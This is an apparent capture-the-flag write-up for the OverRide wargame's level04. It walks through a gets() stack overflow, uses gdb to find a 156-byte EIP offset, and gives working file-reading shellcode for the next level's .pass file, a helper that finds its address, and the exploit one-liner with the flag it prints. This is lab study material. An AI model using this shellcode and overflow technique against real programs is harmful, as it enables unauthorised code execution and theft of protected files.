# Buffer Overflow Attack

The program create a childe process using fork() function, then retreive the input from used using gets() function without checking if the data is larger than the buffer size which is 128.

The value of offset is unkown, so using a unique pattern can help getting the exact its value, like this:
```
(gdb) set follow-fork-mode child
(gdb) break main
Breakpoint 1 at 0x80486cd
(gdb) run
Starting program: /home/users/level04/level04
(gdb) c
Continuing.
[New process 1650]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1650]
0x41326641 in ?? ()
```

The EIP was overwriten with **0x41326641**, which decodes to **'Af2A'** in the pattern. And the the value 'Af2A' appears in the 156th position, meaning the to overflow the buffer, 156 bytes should be inserted, and the following 4 bytes (157 to 160) are the EIP address that will be redirected to the execution of the shellcode instead.

Since the program uses `ptrace()` function to detect and block the `execve()` syscall that would have been useful to access the shell environment using something like: `execve('/bin/bash')`. Another alternative is to use a shellcode that opens and reads the .pass file that contains the flag and display it, it looks like this in machine code language:
```
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

In order to get the address of the shellcode from memory:
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}
```

The following command is used to overflow the buffer and execute the shellcode in the return address instead to get the flag:

```
level04@OverRide:/tmp$ gcc -m32 getenv.c
level04@OverRide:/tmp$ 
level04@OverRide:/tmp$ ./a.out
0xffffd8a1
level04@OverRide:/tmp$ cd
level04@OverRide:~$ python -c "print 156 * 'a' + '\xff\xff\xd8\xa1'[::-1]" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```